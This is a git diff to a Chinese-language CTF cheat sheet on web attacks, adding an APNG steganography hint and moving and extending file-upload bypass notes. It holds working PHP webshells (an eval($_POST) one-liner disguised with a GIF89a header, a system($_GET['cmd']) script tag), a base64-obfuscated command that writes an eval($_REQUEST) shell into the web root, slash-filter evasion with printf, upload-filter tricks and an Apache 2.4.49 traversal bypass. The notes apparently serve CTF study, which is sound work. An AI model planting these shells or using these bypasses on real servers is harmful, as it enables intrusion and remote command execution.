@@ -994,6 +994,10 @@ express的parameterLimit默认为1000, 如果过长可能引发安全问题, 导
 
 ## Misc
 
+### 不同类型的图片隐写
+
+aCTL, fcTL特征 ->判断为apng动图
+
 ### 文件上传绕过
 
 #### perl (.pl) 漏洞
@@ -1019,22 +1023,8 @@ my $cgi= CGI->new; if ( $cgi->upload( 'file' ) ) { my $file= $cgi->param(
 
 > 注: 绕过 '/' 的方式: 利用printf (bash 命令)
 
-> 在你需要用 / 的地方, 换用 $(printf${IFS}'\057') 或者 $(printf${IFS}"\057")
+> 在你需要用 / 的地方, 换用 `$(printf${IFS}'\057')` 或者 `$(printf${IFS}"\057")`
 
-#### 一句话木马
-
-常用一句话木马:
-```php
-GIF89a
-<?=@eval($_POST['shell']);?>
-```
-
-你需要知道:
-`<?= expr ?>` ＝ `<?php echo expr; ?>`
-
-1. 抓包, 把 `Content-Type:` 改为 `image/jpg`
-2.  改后缀, 改文件头, 例如 jpg 的文件头 :`GIF89a`
-3.  windows 空格绕过: 原理是windows系统不允许最后一个字符是空格, 会自动去掉
 
 #### user.ini 绕过
 
@@ -1069,6 +1059,12 @@ auto_prepend_file=shell.jpg
 <script language="php">
     system($_GET['cmd']); // 执行系统命令
 </script>
+```
+
+绕过 eval 等, 使用 base64:
+
+```php
+system('echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d > /var/www/html/1.php');
 ```
 
 #### .htaccess解析漏洞
@@ -1228,3 +1224,18 @@ http://[::ffff:7f00:1]/
 生效版本: Apache HTTP Server 2.4.49
 
 `../` 被 WAF, 但是 `.%2e/` 或者 `%2e%2e/` (全用或者混用 URL 编码) 可以通过; 绕过 WAF, 执行结果是读取 Apache web 目录以外的其他文件; 或者在开启了 cgi 的服务器上**执行任意命令**;
+
+## 一句话木马
+
+常用一句话木马:
+```php
+GIF89a
+<?=@eval($_POST['shell']);?>
+```
+
+你需要知道:
+`<?= expr ?>` ＝ `<?php echo expr; ?>`
+
+1. 抓包, 把 `Content-Type:` 改为 `image/jpg`
+2.  改后缀, 改文件头, 例如 jpg 的文件头 :`GIF89a`
+3.  windows 空格绕过: 原理是windows系统不允许最后一个字符是空格, 会自动去掉
